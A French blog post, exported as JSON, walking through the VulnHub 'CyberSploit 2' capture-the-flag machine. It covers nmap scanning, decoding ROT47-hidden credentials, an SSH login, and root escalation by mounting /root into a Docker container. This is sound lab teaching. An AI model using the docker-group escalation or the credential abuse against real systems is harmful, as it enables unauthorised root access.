{"hash":"e9e710b63b02d049a9f8a5359c5c22618737fe2f","data":{"post":{"title":"CTF Cybersploit: 2","date":"15 June 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.1</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.21</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir Cybersploit2 &amp;&amp; cd Cybersploit2</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -A -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nPORT   STATE SERVICE VERSION\n<span class=\"token number\">22</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">8.0</span> <span class=\"token punctuation\">(</span>protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span> ssh-hostkey: \n<span class=\"token operator\">|</span>   <span class=\"token number\">3072</span> ad:6d:15:e7:44:e9:7b:b8:59:09:19:5c:bd:d6:6b:10 <span class=\"token punctuation\">(</span>RSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>   <span class=\"token number\">256</span> d6:d5:b4:5d:8d:f9:5e:6f:3a:31:ad:81:80:34:9b:12 <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> <span class=\"token number\">69</span>:79:4f:8c:90:e9:43:6c:17:f7:31:e8:ff:87:05:31 <span class=\"token punctuation\">(</span>ED25519<span class=\"token punctuation\">)</span>\n<span class=\"token number\">80</span>/tcp <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.4</span>.37 <span class=\"token variable\"><span class=\"token punctuation\">((</span>centos<span class=\"token punctuation\">))</span></span>\n<span class=\"token operator\">|</span> http-methods: \n<span class=\"token operator\">|</span>_  Potentially risky methods: TRACE\n<span class=\"token operator\">|</span>_http-server-header: Apache/2.4.37 <span class=\"token punctuation\">(</span>centos<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-title: CyberSploit2</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur <strong>Apache</strong> 2.4.37 sur le port <strong>80</strong>.</p>\n<p>Rgardons dans le code source de la page qui comporte un tableau d'utilisateurs et de mots de passe.</p>\n<div class=\"gridsome-highlight\" data-language=\"txt\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"><code class=\"language-txt\">&lt;!----------ROT47----------&gt;  </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Sur Internet, avec le mot clef \"ROT47\", on tombe sur du chiffrement.</p>\n<blockquote>\n<p>ROT47 est une variante de ROT13 qui permet de chiffrer les lettres, les chiffres, et les autres caractères spéciaux2. ROT47 se base sur le code ASCII, qui assigne à chaque symbole un nombre. Il utilise les nombres dans l’intervalle 33 à 126, correspondant respectivement au point d’exclamation (« ! ») et au symbole tilde (« ~ »). Ensuite, selon le même principe que le ROT13, il effectue une rotation de 47 lettres. Le fait d’utiliser un panel de symboles plus important que le ROT13 permet un brouillage plus efficace, même si le code reste trivial à déchiffrer.\nSource : <a href=\"https://fr.wikipedia.org/wiki/ROT13#Variante\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Wikipedia</a>.</p>\n</blockquote>\n<p>Sur l'une des lignes du tableau, on a couple d'identifiant qui sort du lot \"D92:=6?5C2\" et \"4J36CDA=@:E`\". Quand on décode l'utilisateur, on a \"shailendra\" et le mot de passe \"cybersploit1\".</p>\n<h2>Pénétration</h2>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ssh</span> shailendra@<span class=\"token variable\">$IP</span>\npassword: cybersploit1</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Dans le répertoire de cet utilisateur, on découvre un fichier d'indice.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> hint.txt\ndocker</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Ce dernier nous indique d'utiliser Docker.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">id</span><span class=\"token operator\">=</span><span class=\"token number\">1001</span><span class=\"token punctuation\">(</span>shailendra<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">1001</span><span class=\"token punctuation\">(</span>shailendra<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">1001</span><span class=\"token punctuation\">(</span>shailendra<span class=\"token punctuation\">)</span>,991<span class=\"token punctuation\">(</span>docker<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Et, effectivement, l'utilisateur courant appartient au groupe \"docker\".</p>\n<h2>Escalation</h2>\n<p>Cela signifie que l'on peut créer des containers avec des privilèges root car oui, Docker a la réputation d'être rootless. On lance donc un container (éphémère) avec un volume sur le dossier \"/root\".</p>\n<p><code class=\"language-text\">docker run --rm -v /root:/root -ti alpine /bin/ash</code></p>\n<p>De cette façon, on est dans le container et on peut accéder au contenu dossier \"/root\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /root/flag.txt\nPwned CyberSploit2 POC</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n","download":"https://www.vulnhub.com/entry/cybersploit-2,511","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"}],"timeToRead":3,"parts":[{"title":"CTF Cybersploit: 1","href":"ctf-cybersploit-1"},{"title":"CTF Cybersploit: 2","href":""}]}},"context":{}}